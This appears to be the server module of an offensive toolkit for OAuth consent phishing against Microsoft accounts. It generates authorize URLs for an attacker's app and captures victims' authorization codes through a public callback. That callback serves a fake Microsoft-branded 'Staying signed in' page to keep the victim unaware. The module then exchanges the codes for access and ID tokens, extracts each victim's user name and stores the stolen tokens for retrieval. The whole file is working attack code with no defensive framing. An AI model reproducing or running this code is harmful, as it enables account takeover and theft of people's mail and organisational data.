const https = require('https');

function genId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
}

function httpsPost(hostname, path, formData) {
  return new Promise((resolve, reject) => {
    const postData = new URLSearchParams(formData).toString();
    const opts = {
      hostname, path, method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData),
        Accept: 'application/json',
      },
    };
    const req = https.request(opts, (res) => {
      let raw = '';
      res.on('data', c => { raw += c; });
      res.on('end', () => resolve({ status: res.statusCode, body: raw }));
    });
    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

// In-memory capture store (cleared on server restart)
const captures = new Map();

// POST /api/evil-oauth/generate-url
exports.generateUrl = (req, res) => {
  const { clientId, scopes, tenant = 'organizations', redirectUri, prompt = 'consent' } = req.body;
  if (!clientId || !redirectUri) {
    return res.status(400).json({ error: 'clientId and redirectUri are required' });
  }
  const scopeArr = Array.isArray(scopes) ? scopes : String(scopes || 'openid profile email').split(/\s+/);
  const params = new URLSearchParams({
    client_id:     clientId,
    response_type: 'code',
    redirect_uri:  redirectUri,
    scope:         scopeArr.join(' '),
    prompt,
    response_mode: 'query',
  });
  res.json({ url: `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/authorize?${params}` });
};

// GET /api/evil-oauth/callback — public OAuth redirect endpoint
exports.callback = (req, res) => {
  const { code, state, error, error_description } = req.query;
  const id = genId();
  captures.set(id, {
    id,
    receivedAt:    new Date().toISOString(),
    code:          code || null,
    state:         state || null,
    error:         error ? `${error}: ${error_description || ''}`.replace(/:$/, '').trim() : null,
    status:        code ? 'captured' : 'error',
    tokenResponse: null,
    upn:           null,
  });

  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Completing sign-in\u2026</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f3f2f1;font-family:'Segoe UI',system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh}.card{background:#fff;border-radius:4px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2);text-align:center;max-width:440px;width:90%}h1{color:#1b1b1b;font-size:18px;font-weight:600;margin-bottom:8px}p{color:#605e5c;font-size:13px;margin-bottom:24px}.bar{height:4px;background:#f3f2f1;border-radius:2px;overflow:hidden}.prog{height:100%;width:0;background:#0078d4;animation:ld 2.5s ease-in-out forwards}@keyframes ld{0%{width:0}60%{width:70%}100%{width:95%}}</style>
</head><body><div class="card">
<svg width="108" height="24" style="margin-bottom:24px"><text y="20" font-size="18" font-family="'Segoe UI',sans-serif" font-weight="600" fill="#0078d4">Microsoft</text></svg>
<h1>Staying signed in</h1><p>Setting up your account. This only takes a moment.</p>
<div class="bar"><div class="prog"></div></div>
</div><script>setTimeout(()=>{document.querySelector('h1').textContent="You're all set!";document.querySelector('p').textContent='Your account has been connected. You may close this window.';},2500)</script></body></html>`);
};

// POST /api/evil-oauth/exchange
exports.exchange = async (req, res) => {
  const { id, clientId, clientSecret, redirectUri, tenant = 'organizations' } = req.body;
  if (!id || !clientId || !clientSecret || !redirectUri) {
    return res.status(400).json({ error: 'id, clientId, clientSecret, redirectUri required' });
  }
  const entry = captures.get(id);
  if (!entry) return res.status(404).json({ error: 'Capture not found' });
  if (!entry.code) return res.status(400).json({ error: 'No code in this capture' });
  if (entry.status === 'exchanged') return res.json(entry);

  entry.status = 'exchanging';
  captures.set(id, entry);

  try {
    const r = await httpsPost('login.microsoftonline.com', `/${tenant}/oauth2/v2.0/token`, {
      grant_type:    'authorization_code',
      code:          entry.code,
      redirect_uri:  redirectUri,
      client_id:     clientId,
      client_secret: clientSecret,
    });
    const data = JSON.parse(r.body);
    if (data.error) {
      entry.status = 'failed';
      entry.error  = `${data.error}: ${data.error_description || ''}`.replace(/:$/, '').trim();
    } else {
      entry.status        = 'exchanged';
      entry.tokenResponse = data;
      entry.error         = null;
      if (data.id_token) {
        try {
          const b64     = data.id_token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
          const payload = JSON.parse(Buffer.from(b64, 'base64').toString());
          entry.upn = payload.upn || payload.preferred_username || payload.email || null;
        } catch {}
      }
    }
  } catch (e) {
    entry.status = 'failed';
    entry.error  = e.message;
  }
  captures.set(id, entry);
  res.json(entry);
};

// GET /api/evil-oauth/captures
exports.getCaptures = (req, res) => {
  res.json([...captures.values()].sort((a, b) => b.receivedAt.localeCompare(a.receivedAt)));
};

// DELETE /api/evil-oauth/captures/:id
exports.deleteCapture = (req, res) => {
  captures.delete(req.params.id);
  res.json({ ok: true });
};

// DELETE /api/evil-oauth/captures — clear all
exports.clearCaptures = (req, res) => {
  captures.clear();
  res.json({ ok: true });
};
